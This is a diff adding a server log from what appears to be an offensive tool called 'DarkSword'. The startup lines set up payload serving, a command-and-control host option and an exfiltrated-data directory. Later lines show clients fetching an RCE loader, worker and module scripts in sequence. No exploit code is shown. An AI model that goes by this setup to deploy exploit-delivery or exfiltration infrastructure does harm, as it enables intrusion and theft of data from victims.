@@ -1,0 +1,29 @@
+[2026-07-19 10:15:57] DarkSword server listening on http://0.0.0.0:8080
+[2026-07-19 10:15:57] Payloads: D:\wwwroot\darksword\payloads
+[2026-07-19 10:15:57] Access: http://localhost:8080/ or http://<IP>:8080/
+[2026-07-19 10:15:57] rce_loader localHost: auto from each request Host (http). Use --c2-host https://... if you need HTTPS or a public URL.
+[2026-07-19 10:15:57] Exfil data saved to: D:\wwwroot\darksword\exfil
+[2026-07-19 10:15:57] Logs saved to: D:\wwwroot\darksword\server.log
+[2026-07-19 10:17:27] GET / from 192.168.31.85
+[2026-07-19 10:17:27] [REQUEST] "GET / HTTP/1.1" 200 -
+[2026-07-19 10:17:27] GET /frame.html?0.2898385684580327 from 192.168.31.85
+[2026-07-19 10:17:27] [REQUEST] "GET /frame.html?0.2898385684580327 HTTP/1.1" 200 -
+[2026-07-19 10:17:27] GET /rce_loader.js?1784427447267 from 192.168.31.85
+[2026-07-19 10:17:27] [REQUEST] "GET /rce_loader.js?1784427447267 HTTP/1.1" 200 -
+[2026-07-19 10:17:27] GET /rce_worker_18.4.js?1784427447286 from 192.168.31.85
+[2026-07-19 10:17:27] [REQUEST] "GET /rce_worker_18.4.js?1784427447286 HTTP/1.1" 200 -
+[2026-07-19 10:17:27] GET /rce_module.js?1784427447312 from 192.168.31.85
+[2026-07-19 10:17:27] [REQUEST] "GET /rce_module.js?1784427447312 HTTP/1.1" 200 -
+[2026-07-19 10:26:24] GET / from 127.0.0.1
+[2026-07-19 10:26:24] [REQUEST] "GET / HTTP/1.1" 200 -
+[2026-07-19 10:26:24] GET /frame.html?0.5717818617504535 from 127.0.0.1
+[2026-07-19 10:26:24] [REQUEST] "GET /frame.html?0.5717818617504535 HTTP/1.1" 200 -
+[2026-07-19 10:26:25] GET /rce_loader.js?1784427984889 from 127.0.0.1
+[2026-07-19 10:26:25] [REQUEST] "GET /rce_loader.js?1784427984889 HTTP/1.1" 200 -
+[2026-07-19 10:26:25] GET /rce_worker_18.4.js?1784427985095 from 127.0.0.1
+[2026-07-19 10:26:25] [REQUEST] "GET /rce_worker_18.4.js?1784427985095 HTTP/1.1" 200 -
+[2026-07-19 10:26:25] GET /rce_module.js?1784427985206 from 127.0.0.1
+[2026-07-19 10:26:25] [REQUEST] "GET /rce_module.js?1784427985206 HTTP/1.1" 200 -
+[2026-07-19 10:26:25] GET /.well-known/appspecific/com.chrome.devtools.json from 127.0.0.1
+[2026-07-19 10:26:25] [REQUEST] code 404, message File not found
+[2026-07-19 10:26:25] [REQUEST] "GET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1" 404 -
